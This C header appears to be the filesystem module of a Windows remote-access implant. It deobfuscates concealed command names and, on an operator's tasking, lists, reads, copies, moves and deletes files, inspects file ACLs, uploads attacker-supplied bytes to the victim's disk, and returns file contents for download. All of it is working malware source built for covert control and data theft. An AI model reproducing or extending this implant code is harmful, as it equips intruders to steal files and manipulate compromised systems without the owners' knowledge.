#pragma once

#include <Windows.h>
#include "utils/winapi.h"
#include "utils/buffer.h"
#include "constants.h"

/*
Returns true if Task is meant for Filesystem module

PWD
CD DIR_PATH
CP SOURCE DESTINATION
MV SOURCE DESTINATION
RM SOURCE
LS /PATH
ICACLS_FILE /PATH/TO/FILE/ON/CLIENT
UPLOAD FILE_BYTES_B64 /PATH/TO/FILE/ON/TARGET
DOWNLOAD /PATH/TO/FILE/ON/CLIENT
*/
BOOL IsTaskForFilesystem(LPVOID pTask)
{
    if (pTask == NULL)
        return FALSE;

    // Prepare command strings
    static CHAR strAgentCapPwd[STRING_AGENT_CAP_PWD_LEN + 1] = ""; // "PWD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_PWD,
        STRING_AGENT_CAP_PWD_LEN,
        strAgentCapPwd);

    static CHAR strAgentCapCd[STRING_AGENT_CAP_CD_LEN + 1] = ""; // "CD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CD,
        STRING_AGENT_CAP_CD_LEN,
        strAgentCapCd);

    static CHAR strAgentCapCp[STRING_AGENT_CAP_CP_LEN + 1] = ""; // "CP"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CP,
        STRING_AGENT_CAP_CP_LEN,
        strAgentCapCp);

    static CHAR strAgentCapMv[STRING_AGENT_CAP_MV_LEN + 1] = ""; // "MV"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_MV,
        STRING_AGENT_CAP_MV_LEN,
        strAgentCapMv);

    static CHAR strAgentCapRm[STRING_AGENT_CAP_RM_LEN + 1] = ""; // "RM"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_RM,
        STRING_AGENT_CAP_RM_LEN,
        strAgentCapRm);

    static CHAR strAgentCapLs[STRING_AGENT_CAP_LS_LEN + 1] = ""; // "LS"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_LS,
        STRING_AGENT_CAP_LS_LEN,
        strAgentCapLs);

    static CHAR strAgentCapUpload[STRING_AGENT_CAP_UPLOAD_LEN + 1] = ""; // "UPLOAD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_UPLOAD,
        STRING_AGENT_CAP_UPLOAD_LEN,
        strAgentCapUpload);

    static CHAR strAgentCapDownload[STRING_AGENT_CAP_DOWNLOAD_LEN + 1] = ""; // "DOWNLOAD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_DOWNLOAD,
        STRING_AGENT_CAP_DOWNLOAD_LEN,
        strAgentCapDownload);

    static CHAR strAgentCapIcaclsFile[STRING_AGENT_CAP_ICACLS_FILE_LEN + 1] = ""; // "ICACLS_FILE"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_ICACLS_FILE,
        STRING_AGENT_CAP_ICACLS_FILE_LEN,
        strAgentCapIcaclsFile);

    static CHAR strAgentCapMkdir[STRING_AGENT_CAP_MKDIR_LEN + 1] = ""; // "MKDIR"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_MKDIR,
        STRING_AGENT_CAP_MKDIR_LEN,
        strAgentCapMkdir);

    static CHAR strAgentCapCat[STRING_AGENT_CAP_CAT_LEN + 1] = ""; // "CAT"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CAT,
        STRING_AGENT_CAP_CAT_LEN,
        strAgentCapCat);

    return (
        CompareBuffer(pTask, strAgentCapPwd, STRING_AGENT_CAP_PWD_LEN) ||
        CompareBuffer(pTask, strAgentCapCd, STRING_AGENT_CAP_CD_LEN) ||
        CompareBuffer(pTask, strAgentCapCp, STRING_AGENT_CAP_CP_LEN) ||
        CompareBuffer(pTask, strAgentCapMv, STRING_AGENT_CAP_MV_LEN) ||
        CompareBuffer(pTask, strAgentCapRm, STRING_AGENT_CAP_RM_LEN) ||
        CompareBuffer(pTask, strAgentCapLs, STRING_AGENT_CAP_LS_LEN) ||
        CompareBuffer(pTask, strAgentCapUpload, STRING_AGENT_CAP_UPLOAD_LEN) ||
        CompareBuffer(pTask, strAgentCapDownload, STRING_AGENT_CAP_DOWNLOAD_LEN) ||
        CompareBuffer(pTask, strAgentCapIcaclsFile, STRING_AGENT_CAP_ICACLS_FILE_LEN) ||
        CompareBuffer(pTask, strAgentCapMkdir, STRING_AGENT_CAP_MKDIR_LEN) ||
        CompareBuffer(pTask, strAgentCapCat, STRING_AGENT_CAP_CAT_LEN));
}

/*
Handles filesystem related tasks

pResult must be manually freed
*/
void HandleTaskFilesystem(IN WinApiCustom *pWinApiCustom, IN LPVOID pTask, OUT PBOOL pIsSuccess, OUT VOID **pResult, OUT PDWORD pResultSize)
{
    if (pTask == NULL)
        return;

    // Initialise output values
    *pIsSuccess = FALSE;
    *pResult = NULL;
    *pResultSize = 0;

    // Prepare command strings
    static CHAR strAgentCapPwd[STRING_AGENT_CAP_PWD_LEN + 1] = ""; // "PWD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_PWD,
        STRING_AGENT_CAP_PWD_LEN,
        strAgentCapPwd);

    static CHAR strAgentCapCd[STRING_AGENT_CAP_CD_LEN + 1] = ""; // "CD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CD,
        STRING_AGENT_CAP_CD_LEN,
        strAgentCapCd);

    static CHAR strAgentCapCp[STRING_AGENT_CAP_CP_LEN + 1] = ""; // "CP"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CP,
        STRING_AGENT_CAP_CP_LEN,
        strAgentCapCp);

    static CHAR strAgentCapMv[STRING_AGENT_CAP_MV_LEN + 1] = ""; // "MV"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_MV,
        STRING_AGENT_CAP_MV_LEN,
        strAgentCapMv);

    static CHAR strAgentCapRm[STRING_AGENT_CAP_RM_LEN + 1] = ""; // "RM"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_RM,
        STRING_AGENT_CAP_RM_LEN,
        strAgentCapRm);

    static CHAR strAgentCapLs[STRING_AGENT_CAP_LS_LEN + 1] = ""; // "LS"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_LS,
        STRING_AGENT_CAP_LS_LEN,
        strAgentCapLs);

    static CHAR strAgentCapUpload[STRING_AGENT_CAP_UPLOAD_LEN + 1] = ""; // "UPLOAD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_UPLOAD,
        STRING_AGENT_CAP_UPLOAD_LEN,
        strAgentCapUpload);

    static CHAR strAgentCapDownload[STRING_AGENT_CAP_DOWNLOAD_LEN + 1] = ""; // "DOWNLOAD"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_DOWNLOAD,
        STRING_AGENT_CAP_DOWNLOAD_LEN,
        strAgentCapDownload);

    static CHAR strAgentCapIcaclsFile[STRING_AGENT_CAP_ICACLS_FILE_LEN + 1] = ""; // "ICACLS_FILE"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_ICACLS_FILE,
        STRING_AGENT_CAP_ICACLS_FILE_LEN,
        strAgentCapIcaclsFile);

    static CHAR strAgentCapMkdir[STRING_AGENT_CAP_MKDIR_LEN + 1] = ""; // "MKDIR"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_MKDIR,
        STRING_AGENT_CAP_MKDIR_LEN,
        strAgentCapMkdir);

    static CHAR strAgentCapCat[STRING_AGENT_CAP_CAT_LEN + 1] = ""; // "CAT"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_CAT,
        STRING_AGENT_CAP_CAT_LEN,
        strAgentCapCat);

    // Handle operations

    //// Print working directory - PWD
    if (CompareBuffer(pTask, strAgentCapPwd, STRING_AGENT_CAP_PWD_LEN))
    {
        *pResult = pWinApiCustom->GetCurrentWorkingDirectoryCustom();
        if (*pResult != NULL)
        {
            *pResultSize = StrLen((PCHAR)(*pResult));
            *pIsSuccess = TRUE;
        }
    }

    //// Change working directory - CD DIR_PATH
    else if (CompareBuffer(pTask, strAgentCapCd, STRING_AGENT_CAP_CD_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            *pIsSuccess = pWinApiCustom->ChangeCurrentWorkingDirectoryCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1));
        }
    }

    //// Copy file - CP SOURCE DESTINATION
    else if (CompareBuffer(pTask, strAgentCapCp, STRING_AGENT_CAP_CP_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 3)
        {
            *pIsSuccess = pWinApiCustom->CopyFileCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                NullSeparatedArrayStringAt((PCHAR)pTask, 2));
        }
    }

    //// Move file - MV SOURCE DESTINATION
    else if (CompareBuffer(pTask, strAgentCapMv, STRING_AGENT_CAP_MV_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 3)
        {
            *pIsSuccess = pWinApiCustom->MoveFileCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                NullSeparatedArrayStringAt((PCHAR)pTask, 2));
        }
    }

    //// Delete file - RM SOURCE
    else if (CompareBuffer(pTask, strAgentCapRm, STRING_AGENT_CAP_RM_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            *pIsSuccess = pWinApiCustom->DeleteFileOrDirCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1));
        }
    }

    //// List directory - LS /PATH
    else if (CompareBuffer(pTask, strAgentCapLs, STRING_AGENT_CAP_LS_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 1 || NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            PWIN32_FIND_DATAA pWin32FindDataArray = NULL;
            DWORD win32FindArraySize = 0;
            PCHAR pListingDescribed = NULL;
            PCHAR dirPath = NULL;

            // If no argument to LS is given, assume Current directory to be argument
            PCHAR currentDirectory = pWinApiCustom->GetCurrentWorkingDirectoryCustom();
            if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 1)
            {
                dirPath = pWinApiCustom->GetCurrentWorkingDirectoryCustom();
            }
            // Else, take the argument given
            else
            {
                dirPath = NullSeparatedArrayStringAt((PCHAR)pTask, 1);
            }

            if (dirPath != NULL)
            {
                // Invoke listing function
                pWinApiCustom->ListDirectoryCustom(
                    dirPath,
                    &pWin32FindDataArray,
                    &win32FindArraySize);
                if (win32FindArraySize != 0 && pWin32FindDataArray != NULL)
                {
                    pWinApiCustom->DescribeDirectoryListingCustom(
                        pWin32FindDataArray,
                        win32FindArraySize,
                        (CHAR **)pResult);

                    if (*pResult != NULL)
                    {
                        *pResultSize = StrLen((PCHAR)(*pResult));
                        *pIsSuccess = TRUE;
                    }
                }

                // Cleanup
                if (pWin32FindDataArray != NULL)
                    pWinApiCustom->HeapFreeCustom(pWin32FindDataArray);

                if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 1 && dirPath != NULL)
                    pWinApiCustom->HeapFreeCustom(dirPath);
            }
        }
    }

    //// List file security info - ICACLS_FILE /PATH/TO/FILE/ON/CLIENT
    else if (CompareBuffer(pTask, strAgentCapIcaclsFile, STRING_AGENT_CAP_ICACLS_FILE_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            SECURITY_INFO_CUSTOM securityInfoCustom;
            RtlZeroMemoryCustom((PBYTE)&securityInfoCustom, sizeof(securityInfoCustom));

            pWinApiCustom->GetFileSecurityInformationCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                &securityInfoCustom);

            pWinApiCustom->DescribeSecurityInfoCustom(
                &securityInfoCustom,
                (CHAR **)pResult);

            if (securityInfoCustom.pAcesCustom != NULL)
                pWinApiCustom->HeapFreeCustom(securityInfoCustom.pAcesCustom);

            if (*pResult != NULL)
            {
                *pResultSize = StrLen((PCHAR)(*pResult));
                *pIsSuccess = TRUE;
            }
        }
    }

    //// Download file - DOWNLOAD /PATH/TO/FILE/ON/CLIENT
    else if (CompareBuffer(pTask, strAgentCapDownload, STRING_AGENT_CAP_DOWNLOAD_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            DWORD64 numOfBytesRead = 0;
            *pResult = (PCHAR)(pWinApiCustom->ReadFileCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                &numOfBytesRead));

            if (*pResult != NULL && numOfBytesRead != 0)
            {
                *pResultSize = numOfBytesRead;
                *pIsSuccess = TRUE;
            }
        }
    }

    //// Upload file - UPLOAD FILE_BYTES_B64 /PATH/TO/FILE/ON/TARGET
    else if (CompareBuffer(pTask, strAgentCapUpload, STRING_AGENT_CAP_UPLOAD_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 3)
        {
            PCHAR whatToWriteB64 = NullSeparatedArrayStringAt((PCHAR)pTask, 1);
            LPVOID pWhatToWrite = pWinApiCustom->HeapAllocCustom((((StrLen(whatToWriteB64) / 4) * 3) + 1));
            DWORD whatToWriteSize = 0;

            if (pWhatToWrite != NULL)
            {
                if (Base64Decode(
                        whatToWriteB64,
                        (PUCHAR)pWhatToWrite,
                        &whatToWriteSize))
                {
                    *pIsSuccess = pWinApiCustom->WriteFileCustom(
                        NullSeparatedArrayStringAt((PCHAR)pTask, 2),
                        pWhatToWrite,
                        whatToWriteSize);
                }

                pWinApiCustom->HeapFreeCustom(pWhatToWrite);
            }
        }
    }

    //// Make directory - MKDIR DIR_NAME
    else if (CompareBuffer(pTask, strAgentCapMkdir, STRING_AGENT_CAP_MKDIR_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            *pIsSuccess = pWinApiCustom->loadedFunctions.CreateDirectoryA(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                NULL);
        }
    }

    //// Get file contents - CAT FILE_PATH
    else if (CompareBuffer(pTask, strAgentCapCat, STRING_AGENT_CAP_CAT_LEN))
    {
        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
        {
            DWORD64 numOfBytesRead = 0;

            LPVOID pFileContents = pWinApiCustom->ReadFileCustom(
                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
                &numOfBytesRead);

            if (pFileContents != NULL && numOfBytesRead != 0)
            {
                *pIsSuccess = TRUE;
                *pResultSize = numOfBytesRead;
                *pResult = pFileContents;
            }
        }
    }
}
